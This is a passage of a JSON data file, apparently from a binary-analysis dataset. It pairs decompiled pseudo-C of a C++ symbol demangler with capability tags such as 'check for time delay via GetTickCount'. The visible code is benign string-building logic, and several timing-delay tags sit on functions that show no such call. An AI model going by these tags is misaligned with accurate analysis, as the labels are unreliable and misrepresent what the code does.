0x100);\n            pcVar19 = \"java resource \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x3e:\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[2]);\n            break;\n        case 0x3f:\n            appiStack200[0] = *(arg1 + 0x100);\n            uVar7 = *(arg3 + 1);\n            if (appiStack200[0] == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar13 = 1;\n                appiStack200[0] = NULL;\n            }\n            else {\n                iVar13 = appiStack200[0] + 1;\n            }\n            *(arg1 + 0x100) = iVar13;\n            arg1[appiStack200[0]] = uVar7;\n            arg1[0x108] = uVar7;\n            break;\n        case 0x40:\n            puVar22 = &stack0xffffffffffffff38;\n            sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, *(arg3 + 1));\n            puVar17 = puVar22;\n            do {\n                puVar16 = puVar17;\n                uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n                uVar7 = uVar6 & 0x80808080;\n                puVar17 = puVar16 + 1;\n            } while (uVar7 == 0);\n            bVar31 = (uVar6 & 0x8080) == 0;\n            if (bVar31) {\n                uVar7 = uVar7 >> 0x10;\n            }\n            if (bVar31) {\n                puVar17 = puVar16 + 6;\n            }\n            appiStack200[0] = uVar7 & 0xffffff00;\n            puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n            if (puVar20 != NULL) {\n                ppiVar10 = *(arg1 + 0x100);\n                puVar17 = puVar20 + puVar22;\n                do {\n                    uVar30 = *puVar22;\n                    if (ppiVar10 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        appiStack200[0] = NULL;\n                        ppiVar10 = 0x1;\n                    }\n                    else {\n                        appiStack200[0] = ppiVar10;\n                        ppiVar10 = ppiVar10 + 1;\n                    }\n                    puVar22 = puVar22 + 1;\n                    *(arg1 + 0x100) = ppiVar10;\n                    arg1[appiStack200[0]] = uVar30;\n                    arg1[0x108] = uVar30;\n                } while (puVar22 != puVar17);\n            }\n            break;\n        case 0x41:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"decltype (\";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            appiStack200[0] = *(arg1 + 0x100);\n            if (appiStack200[0] == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar13 = 1;\n                appiStack200[0] = NULL;\n            }\n            else {\n                iVar13 = appiStack200[0] + 1;\n            }\n            *(arg1 + 0x100) = iVar13;\n            arg1[appiStack200[0]] = 0x29;\n            arg1[0x108] = 0x29;\n            break;\n        case 0x42:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"global constructors keyed to \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x43:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"global destructors keyed to \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x44:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"{lambda(\";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            puVar20 = 0x42db13;\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar13 = *(arg1 + 0x100);\n            do {\n                uVar30 = *puVar20;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                puVar20 = puVar20 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = uVar30;\n                arg1[0x108] = uVar30;\n            } while (puVar20 != 0x42db15);\n            puVar22 = &stack0xffffffffffffff38;\n            sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, *(arg3 + 2) + 1);\n            puVar17 = puVar22;\n            do {\n                puVar16 = puVar17;\n                uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n                uVar7 = uVar6 & 0x80808080;\n                puVar17 = puVar16 + 1;\n            } while (uVar7 == 0);\n            bVar31 = (uVar6 & 0x8080) == 0;\n            if (bVar31) {\n                uVar7 = uVar7 >> 0x10;\n            }\n            if (bVar31) {\n                puVar17 = puVar16 + 6;\n            }\n            puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n            if (puVar20 == NULL) {\n                iVar13 = *(arg1 + 0x100);\n            }\n            else {\n                iVar13 = *(arg1 + 0x100);\n                puVar17 = puVar20 + puVar22;\n                do {\n                    uVar30 = *puVar22;\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                        iVar13 = 1;\n                    }\n                    else {\n                        iVar14 = iVar13;\n                        iVar13 = iVar13 + 1;\n                    }\n                    puVar22 = puVar22 + 1;\n                    *(arg1 + 0x100) = iVar13;\n                    arg1[iVar14] = uVar30;\n                    arg1[0x108] = uVar30;\n                } while (puVar22 != puVar17);\n            }\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                appiStack200[0] = 0x1;\n                iVar13 = 0;\n            }\n            else {\n                appiStack200[0] = iVar13 + 1;\n            }\n            *(arg1 + 0x100) = appiStack200[0];\n            arg1[iVar13] = 0x7d;\n            arg1[0x108] = 0x7d;\n            break;\n        default:\n            *(arg1 + 0x130) = 1;\n            break;\n        case 0x46:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"{unnamed type#\";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            puVar22 = &stack0xffffffffffffff38;\n            sub.msvcrt.dll_sprintf(puVar22, 0x42d8e5, *(arg3 + 1) + 1);\n            puVar17 = puVar22;\n            do {\n                puVar16 = puVar17;\n                uVar6 = *puVar16 + 0xfefefeff & ~*puVar16;\n                uVar7 = uVar6 & 0x80808080;\n                puVar17 = puVar16 + 1;\n            } while (uVar7 == 0);\n            bVar31 = (uVar6 & 0x8080) == 0;\n            if (bVar31) {\n                uVar7 = uVar7 >> 0x10;\n            }\n            if (bVar31) {\n                puVar17 = puVar16 + 6;\n            }\n            puVar20 = puVar17 + ((-3 - CARRY1(uVar7, uVar7)) - puVar22);\n            if (puVar20 == NULL) {\n                iVar13 = *(arg1 + 0x100);\n            }\n            else {\n                iVar13 = *(arg1 + 0x100);\n                puVar17 = puVar20 + puVar22;\n                do {\n                    uVar30 = *puVar22;\n                    if (iVar13 == 0xff) {\n                        arg1[0xff] = 0;\n                        (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                        *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                        iVar14 = 0;\n                        iVar13 = 1;\n                    }\n                    else {\n                        iVar14 = iVar13;\n                        iVar13 = iVar13 + 1;\n                    }\n                    puVar22 = puVar22 + 1;\n                    *(arg1 + 0x100) = iVar13;\n                    arg1[iVar14] = uVar30;\n                    arg1[0x108] = uVar30;\n                } while (puVar22 != puVar17);\n            }\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                appiStack200[0] = 0x1;\n                iVar13 = 0;\n            }\n            else {\n                appiStack200[0] = iVar13 + 1;\n            }\n            *(arg1 + 0x100) = appiStack200[0];\n            arg1[iVar13] = 0x7d;\n            arg1[0x108] = 0x7d;\n            break;\n        case 0x47:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"transaction clone for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x48:\n            iVar13 = *(arg1 + 0x100);\n            pcVar19 = \"non-transaction clone for \";\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            appiStack200[0] = fcn.00407f90(arg1, arg2_00, arg3[1]);\n            break;\n        case 0x49:\n            ppiVar10 = fcn.004020f0(arg1, arg3[1]);\n            if (ppiVar10 == NULL) {\n                fcn.00409420(arg1, arg2_00, arg3[1]);\n                appiStack200[0] = fcn.004046f0(arg1, 0x42dabf);\n            }\n            else {\n                iVar28 = 0;\n                do {\n                    if ((*ppiVar10 != 0x2f) || (ppiVar10[1] == NULL)) {\n                        piVar24 = arg3[1];\n                        if (iVar28 == 0) {\n                            return ppiVar10;\n                        }\n                        goto code_r0x004060c5;\n                    }\n                    ppiVar10 = ppiVar10[2];\n                    iVar28 = iVar28 + 1;\n                } while (ppiVar10 != NULL);\n                piVar24 = arg3[1];\ncode_r0x004060c5:\n                iVar26 = 0;\n                do {\n                    *(arg1 + 0x134) = iVar26;\n                    appiStack200[0] = fcn.00407f90(arg1, arg2_00, piVar24);\n                    if (iVar26 < iVar28 + -1) {\n                        ppiVar10 = *(arg1 + 0x100);\n                        puVar20 = 0x42da68;\n                        do {\n                            uVar30 = *puVar20;\n                            if (ppiVar10 == 0xff) {\n                                arg1[0xff] = 0;\n                                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                                appiStack200[0] = NULL;\n                                ppiVar10 = 0x1;\n                            }\n                            else {\n                                appiStack200[0] = ppiVar10;\n                                ppiVar10 = ppiVar10 + 1;\n                            }\n                            puVar20 = puVar20 + 1;\n                            *(arg1 + 0x100) = ppiVar10;\n                            arg1[appiStack200[0]] = uVar30;\n                            arg1[0x108] = uVar30;\n                        } while (puVar20 != 0x42da6a);\n                    }\n                    iVar26 = iVar26 + 1;\n                } while (iVar26 != iVar28);\n            }\n            break;\n        case 0x4a:\n            pcVar19 = \"[abi:\";\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar13 = *(arg1 + 0x100);\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            appiStack200[0] = *(arg1 + 0x100);\n            if (appiStack200[0] == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar13 = 1;\n                appiStack200[0] = NULL;\n            }\n            else {\n                iVar13 = appiStack200[0] + 1;\n            }\n            *(arg1 + 0x100) = iVar13;\n            arg1[appiStack200[0]] = 0x5d;\n            arg1[0x108] = 0x5d;\n            break;\n        case 0x4b:\n            pcVar19 = \" [clone \";\n            fcn.00407f90(arg1, arg2_00, arg3[1]);\n            iVar13 = *(arg1 + 0x100);\n            do {\n                cVar25 = *pcVar19;\n                if (iVar13 == 0xff) {\n                    arg1[0xff] = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar14 = 0;\n                    iVar13 = 1;\n                }\n                else {\n                    iVar14 = iVar13;\n                    iVar13 = iVar13 + 1;\n                }\n                pcVar19 = pcVar19 + 1;\n                *(arg1 + 0x100) = iVar13;\n                arg1[iVar14] = cVar25;\n                arg1[0x108] = cVar25;\n            } while (pcVar19 != \"\");\n            fcn.00407f90(arg1, arg2_00, arg3[2]);\n            appiStack200[0] = *(arg1 + 0x100);\n            if (appiStack200[0] == 0xff) {\n                arg1[0xff] = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar13 = 1;\n                appiStack200[0] = NULL;\n            }\n            else {\n                iVar13 = appiStack200[0] + 1;\n            }\n            *(arg1 + 0x100) = iVar13;\n            arg1[appiStack200[0]] = 0x5d;\n            arg1[0x108] = 0x5d;\n        }\n        return appiStack200[0];\n    case 0x408365:\n        if ((arg2 & 4) == 0) {\n            ppiVar10 = *(arg1 + 0x100);\n            if (ppiVar10 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x408778;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar13 = 1;\n                ppiVar10 = NULL;\n            }\n            else {\n                iVar13 = ppiVar10 + 1;\n            }\n            *(arg1 + 0x100) = iVar13;\n            arg1[ppiVar10] = 0x2a;\n            arg1[0x108] = 0x2a;\n        }\n        break;\n    case 0x4083a0:\n        ppiVar10 = *(arg1 + 0x100);\ncode_r0x004081ca:\n        if (ppiVar10 == 0xff) {\n            arg1[0xff] = 0;\n            apiStack184[11] = 0x408640;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar13 = 1;\n            ppiVar10 = NULL;\n        }\n        else {\n            iVar13 = ppiVar10 + 1;\n        }\n        *(arg1 + 0x100) = iVar13;\n        arg1[ppiVar10] = 0x26;\n        arg1[0x108] = 0x26;\n        return ppiVar10;\n    case 0x4083b0:\n        ppiVar9 = *(arg1 + 0x100);\ncode_r0x004082aa:\n        puVar20 = 0x42dc9b;\n        do {\n            uVar30 = *puVar20;\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x40830d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = NULL;\n                ppiVar9 = 0x1;\n            }\n            else {\n                ppiVar10 = ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n            }\n            puVar20 = puVar20 + 1;\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[ppiVar10] = uVar30;\n            arg1[0x108] = uVar30;\n        } while (puVar20 != 0x42dc9d);\n        break;\n    case 0x4083c0:\n        ppiVar9 = *(arg1 + 0x100);\n        pcVar19 = \"complex \";\n        do {\n            cVar25 = *pcVar19;\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x40842d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = NULL;\n                ppiVar9 = 0x1;\n            }\n            else {\n                ppiVar10 = ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[ppiVar10] = cVar25;\n            arg1[0x108] = cVar25;\n        } while (pcVar19 != \"\");\n        break;\n    case 0x408440:\n        ppiVar9 = *(arg1 + 0x100);\n        pcVar19 = \"imaginary \";\n        do {\n            cVar25 = *pcVar19;\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x4084ad;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = NULL;\n                ppiVar9 = 0x1;\n            }\n            else {\n                ppiVar10 = ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n            }\n            pcVar19 = pcVar19 + 1;\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[ppiVar10] = cVar25;\n            arg1[0x108] = cVar25;\n        } while (pcVar19 != \"\");\n        break;\n    case 0x4084c0:\n        if (arg1[0x108] != '(') {\n            iVar13 = *(arg1 + 0x100);\n            if (iVar13 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x408749;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar14 = 1;\n                iVar13 = 0;\n            }\n            else {\n                iVar14 = iVar13 + 1;\n            }\n            *(arg1 + 0x100) = iVar14;\n            arg1[iVar13] = 0x20;\n            arg1[0x108] = 0x20;\n        }\n        if (arg3[1] == NULL) {\n            *(arg1 + 0x130) = 1;\n        }\n        else if (*(arg1 + 0x130) == 0) {\n            apiStack184[11] = 0x40861f;\n            fcn.00404790(arg1, arg2_00, arg3[1]);\n        }\n        ppiVar9 = *(arg1 + 0x100);\n        puVar20 = 0x42dcb2;\n        do {\n            uVar30 = *puVar20;\n            if (ppiVar9 == 0xff) {\n                arg1[0xff] = 0;\n                apiStack184[11] = 0x40857d;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                ppiVar10 = NULL;\n                ppiVar9 = 0x1;\n            }\n            else {\n                ppiVar10 = ppiVar9;\n                ppiVar9 = ppiVar9 + 1;\n            }\n            puVar20 = puVar20 + 1;\n            *(arg1 + 0x100) = ppiVar9;\n            arg1[ppiVar10] = uVar30;\n            arg1[0x108] = uVar30;\n        } while (puVar20 != 0x42dcb5);\n        break;\n    case 0x408590:\n        goto code_r0x00408590;\n    }\n    return ppiVar10;\n}\n",
        "token_count": 31181
    },
    "004090e0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid fcn.004090e0(int64_t arg1, uint64_t arg2, int32_t **arg3)\n\n{\n    ulong uVar1;\n    int64_t iVar2;\n    int64_t iVar3;\n    ulong uStack56;\n    int32_t *piStack48;\n    \n    if (**arg3 == 4) {\n        uStack56 = *(arg1 + 0x120);\n        uVar1 = *(arg1 + 0x128);\n        *(arg1 + 0x128) = 0;\n        *(arg1 + 0x120) = &uStack56;\n        piStack48 = *arg3;\n        if (*(piStack48 + 2) == 0) {\n            *(arg1 + 0x130) = 1;\n        }\n        else if (*(arg1 + 0x130) == 0) {\n            fcn.00404790(arg1, arg2 & 0xffffffff, *(piStack48 + 2));\n        }\n        *(arg1 + 0x120) = uStack56;\n        if (*(arg1 + 0x108) == '<') {\n            iVar3 = *(arg1 + 0x100);\n            if (iVar3 == 0xff) {\n                *(arg1 + 0xff) = 0;\n                (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                iVar2 = 1;\n                iVar3 = 0;\n            }\n            else {\n                iVar2 = iVar3 + 1;\n            }\n            *(arg1 + 0x100) = iVar2;\n            *(arg1 + iVar3) = 0x20;\n            *(arg1 + 0x108) = 0x20;\n        }\n        else {\n            iVar2 = *(arg1 + 0x100);\n        }\n        if (iVar2 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar3 = 1;\n            iVar2 = 0;\n        }\n        else {\n            iVar3 = iVar2 + 1;\n        }\n        *(arg1 + 0x100) = iVar3;\n        *(arg1 + iVar2) = 0x3c;\n        *(arg1 + 0x108) = 0x3c;\n        if (*(*arg3 + 4) == 0) {\n            *(arg1 + 0x130) = 1;\n        }\n        else if (*(arg1 + 0x130) == 0) {\n            fcn.00404790(arg1, arg2 & 0xffffffff, *(*arg3 + 4));\n            iVar3 = *(arg1 + 0x100);\n            if (*(arg1 + 0x108) == '>') {\n                if (iVar3 == 0xff) {\n                    *(arg1 + 0xff) = 0;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    iVar3 = 1;\n                    iVar2 = 0;\n                }\n                else {\n                    iVar2 = iVar3;\n                    iVar3 = iVar3 + 1;\n                }\n                *(arg1 + 0x100) = iVar3;\n                *(arg1 + iVar2) = 0x20;\n                *(arg1 + 0x108) = 0x20;\n            }\n        }\n        if (iVar3 == 0xff) {\n            *(arg1 + 0xff) = 0;\n            (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n            *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n            iVar2 = 1;\n            iVar3 = 0;\n        }\n        else {\n            iVar2 = iVar3 + 1;\n        }\n        *(arg1 + 0x100) = iVar2;\n        *(arg1 + iVar3) = 0x3e;\n        *(arg1 + 0x108) = 0x3e;\n        *(arg1 + 0x128) = uVar1;\n        return;\n    }\n    if (*(arg1 + 0x130) != 0) {\n        return;\n    }\n    fcn.00404790(arg1, arg2, *arg3);\n    return;\n}\n",
        "token_count": 1057
    },
    "00409360": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t ** fcn.00409360(uchar *arg1, ulong arg2, int32_t **arg3)\n\n{\n    uint8_t uVar1;\n    char cVar2;\n    ulong arg3_00;\n    ulong *puVar3;\n    ulong uVar4;\n    uint8_t **ppuVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t **ppiVar8;\n    int32_t **ppiVar9;\n    int32_t **ppiVar10;\n    int32_t **in_RAX;\n    int32_t **ppiVar11;\n    uint64_t uVar12;\n    uint64_t uVar13;\n    int64_t iVar14;\n    uint64_t arg2_00;\n    uint8_t *puVar15;\n    uint32_t *puVar16;\n    uint32_t *puVar17;\n    int32_t *piVar18;\n    char *pcVar19;\n    uchar *puVar20;\n    uint8_t *puVar21;\n    uint32_t *puVar22;\n    char *pcVar23;\n    int32_t *piVar24;\n    int64_t iVar25;\n    char cVar26;\n    int32_t iVar27;\n    char *pcVar28;\n    int32_t iVar29;\n    int32_t *piVar30;\n    uchar uVar31;\n    bool bVar32;\n    uchar uVar33;\n    int32_t **ppiStack216;\n    int32_t *piStack208;\n    int32_t **appiStack200 [2];\n    int32_t *apiStack184 [18];\n    \n    if (*arg3 == 0x31) {\n        ppiVar9 = arg3[1];\n        iVar29 = *(ppiVar9 + 2);\n        piVar24 = ppiVar9[1];\n        if (iVar29 != 0) {\n            ppiVar10 = *(arg1 + 0x100);\n            iVar25 = 1;\n            do {\n                uVar31 = *(piVar24 + iVar25 + -1);\n                if (ppiVar10 == 0xff) {\n                    arg1[0xff] = 0;\n                    apiStack184[13] = 0x40940e;\n                    (**(arg1 + 0x110))(arg1, 0xff, *(arg1 + 0x118));\n                    *(arg1 + 0x138) = *(arg1 + 0x138) + 1;\n                    ppiVar9 = NULL;\n                    ppiVar10 = 0x1;\n                }\n                else {\n                    ppiVar9 = ppiVar10;\n                    ppiVar10 = ppiVar10 + 1;\n                }\n                iVar25 = iVar25 + 1;\n                *(arg1 + 0x100) = ppiVar10;\n                arg1[ppiVar9] = uVar31;\n                arg1[0x108] = uVar31;\n            } while (iVar25 != iVar29 + 1);\n        }\n        return ppiVar9;\n    }\n    if (*(arg1 + 0x130) != 0) {\n        return in_RAX;\n    }\n    uVar7 = *arg3;\n    ppiVar9 = uVar7;\n    arg2_00 = arg2;\n    if (0x4b < uVar7) {\ncode_r0x00406473:\n        *(arg1 + 0x130) = 1;\n        return ppiVar9;\n    }\n    switch(*(uVar7 * 4 + 0x42db34) + 0x42db34) {\n    case 0x4047d0:\ncode_r0x004047d0:\n        appiStack200[0] = *(arg1 + 0x128);\ncode_r0x004047d7:\n        *(arg1 + 0x128) = &stack0xffffffffffffff38;\n        apiStack184[1] = *(arg1 + 0x120);\n        appiStack200[1] = arg3;\ncode_r0x00404801:\n        piVar24 = appiStack200[1][1];\ncode_r0x00404805:\n        ppiVar9 = appiStack200[1];\n        apiStack184[0]._0_4_ = 0;\n        fcn.00407f90(arg1, arg2_00, piVar24);\n        if (apiStack184[0] == 0) {\n            fcn.00407fc0(arg1, arg2, ppiVar9);\n        }\n        *(arg1 + 0x128) = appiStack200[0];\n        ppiVar9 = appiStack200[0];\n        break;\n    case 0x404844:\n        appiStack200[0] = *(arg1 + 0x128);\n        ppiVar9 = appiStack200[0];\n        if (appiStack200[0] == NULL) {\n            appiStack200[0] = NULL;\n        }\n        else {\n            do {\n                if (*(ppiVar9 + 2) == 0) {\n                    if (2 < *ppiVar9[1] - 0x19U) break;\n                    if (uVar7 == *ppiVar9[1]) {\n                        ppiVar9 = fcn.00407f90(arg1, arg2_00, arg3[1]);\n                        return ppiVar9;\n                    }\n                }\n                ppiVar9 = *ppiVar9;\n            } while (ppiVar9 != NULL);\n        }\n        goto 